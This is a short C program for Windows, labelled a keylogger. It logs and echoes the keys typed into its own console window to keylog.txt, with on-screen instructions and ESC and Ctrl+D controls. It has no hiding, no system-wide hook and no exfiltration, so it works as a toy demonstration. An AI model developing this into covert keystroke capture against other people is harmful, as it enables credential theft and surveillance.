#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>

void append_key_to_file(char pressed_key) {
    FILE *log_file = fopen("keylog.txt", "a");

    if (log_file == NULL) {
        printf("Unable to open keylog.txt file!\n");
        exit(1);
    }

    if (pressed_key == '\b') {
        fprintf(log_file, "[BACKSPACE]");
        printf("[BACKSPACE]");
    } else if (pressed_key == '\r') {
        fprintf(log_file, "\n");
        printf("\n");
    } else if (pressed_key == '\t') {
        fprintf(log_file, "[TAB]");
        printf("[TAB]");
    } else {
        fprintf(log_file, "%c", pressed_key);
        printf("%c", pressed_key);
    }

    fclose(log_file);
}

void erase_log_file() {
    FILE *log_file = fopen("keylog.txt", "w");

    if (log_file == NULL) {
        printf("Error: Cannot clear keylog.txt!\n");
        exit(1);
    }

    fclose(log_file);
    printf("\nKeylog file has been successfully cleared.\n");
}

int main() {
    char current_key;

    printf("Instructions:\n");
    printf("1. Press 'ESC' to stop the keylogger.\n");
    printf("2. Press 'Ctrl+D' to delete all keylog data.\n");

    while (1) {

        if (_kbhit()) {
            current_key = _getch();

            if (current_key == 27) {
                printf("\nKeylogger terminated.\n");
                break;
            }

            if (current_key == 4) {
                erase_log_file();
                continue;
            }

            append_key_to_file(current_key);
        }

        Sleep(50);
    }

    return 0;
}
